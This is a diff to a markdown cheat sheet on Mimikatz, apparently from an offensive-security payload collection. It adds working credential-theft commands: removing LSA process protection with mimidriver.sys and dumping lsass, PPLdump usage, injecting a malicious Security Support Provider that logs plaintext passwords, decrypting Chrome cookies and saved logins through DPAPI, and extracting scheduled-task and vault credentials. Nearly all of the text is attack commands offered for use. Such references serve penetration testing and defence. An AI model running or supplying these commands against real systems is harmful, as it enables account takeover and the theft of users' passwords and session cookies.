@@ -11,6 +11,9 @@
 * [Mimikatz - Skeleton key](#mimikatz---skeleton-key)
 * [Mimikatz - RDP session takeover](#mimikatz---rdp-session-takeover)
 * [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
+  * [Chrome Cookies & Credential](#chrome-cookies--credential)
+  * [Task Scheduled credentials](#task-scheduled-credentials)
+  * [Vault](#vault)
 * [Mimikatz - Commands list](#mimikatz---commands-list)
 * [Mimikatz - Powershell version](#mimikatz---powershell-version)
 * [References](#references)
@@ -61,13 +64,13 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 ## Mimikatz - LSA Protection Workaround
 
-- LSA as a Protected Process
+- LSA as a Protected Process (RunAsPPL)
   ```powershell
   # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
   # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
-  #Now lets import the mimidriver.sys to the system
+  # Now lets import the mimidriver.sys to the system
   mimikatz # !+
 
   # Now lets remove the protection flags from lsass.exe process
@@ -77,15 +80,27 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   mimikatz # privilege::debug    
   mimikatz # token::elevate
   mimikatz # sekurlsa::logonpasswords
+  
+  # Now lets re-add the protection flags to the lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe
+
+  # Unload the service created
+  mimikatz # !-
+
+
+  # https://github.com/itm4n/PPLdump
+  PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
+  PPLdump.exe lsass.exe lsass.dmp
+  PPLdump.exe -v 720 out.dmp
   ```
 
-- LSA is running as virtualized process (LSAISO) by Credential Guard
+- LSA is running as virtualized process (LSAISO) by **Credential Guard**
   ```powershell
   # Check if a process called lsaiso.exe exists on the running processes
   tasklist |findstr lsaiso
 
-  # If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
-  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  # Lets inject our own malicious Security Support Provider into memory
+  # require mimilib.dll in the same folder
   mimikatz # misc::memssp
 
   # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
@@ -172,8 +187,6 @@ net start sesshijack
 ```
 
 
-
-
 ## Mimikatz - Credential Manager & DPAPI
 
 ```powershell
@@ -190,7 +203,18 @@ $ mimikatz !sekurlsa::dpapi
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
 
-Task Scheduled credentials
+### Chrome Cookies & Credential
+
+```powershell
+# Saved Cookies
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
+dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
+
+# Saved Credential in Chrome
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+### Task Scheduled credentials
 
 ```powershell
 mimikatz(commandline) # vault::cred /patch
@@ -202,6 +226,12 @@ Persist    : 2 - local_machine
 Flags      : 00004004
 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Attributes : 0
+```
+
+### Vault
+
+```powershell
+vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 ```
 
 
